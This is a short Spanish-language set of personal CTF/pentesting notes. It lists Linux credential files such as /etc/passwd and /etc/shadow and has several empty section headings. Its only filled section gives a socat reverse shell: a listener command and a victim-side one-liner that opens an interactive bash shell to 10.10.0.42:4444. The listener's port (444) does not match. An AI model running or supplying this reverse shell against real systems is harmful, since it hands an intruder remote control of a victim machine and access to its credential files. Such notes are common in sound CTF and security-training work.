#cybersecurity #CTF  #windows #linux

[[Herramientas]]
[[Linux Tools para Personalizar]]
[[Payloads]]
## Nativo en Linux

- `/etc/passwd`: Usuarios
- `/etc/shadow`: Contraseñas hasheadas
- `/etc/os-release`: 

---
## Nativo en Windows

---

## Nmap Comandos usados


## Reverse Shell comandos

A continuación se presentan los comandos que he usado para poder hacer reverse shell.

### Netcat

### Penelope

### Usando SOCAT

```shell
# Listener
socat file:`tty`,raw,echo=0 tcp-listen:444 
```

```shell
# Conexión desde la victima
sudo prueba2.sass; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.0.42:4444
```